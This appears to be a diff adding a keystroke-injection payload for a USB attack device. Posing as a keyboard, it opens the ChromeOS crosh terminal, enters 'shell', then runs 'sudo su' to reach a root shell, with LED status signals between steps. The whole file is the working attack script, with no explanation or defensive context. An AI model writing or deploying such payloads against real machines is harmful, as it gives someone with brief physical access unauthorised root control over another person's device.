@@ -1,0 +1,13 @@
+LED R B
+ATTACKMODE HID
+QUACK GUI
+QUACK STRING chrome-extension://nkoccljplnhpfnfiajclkommnmllphnl/html/crosh.htm
+QUACK DELAY 100
+QUACK ENTER
+LED B 
+QUACK DELAY 5000
+QUACK STRING shell 
+QUACK ENTER 
+QUACK STRING sudo su 
+QUACK ENTER
+LED G
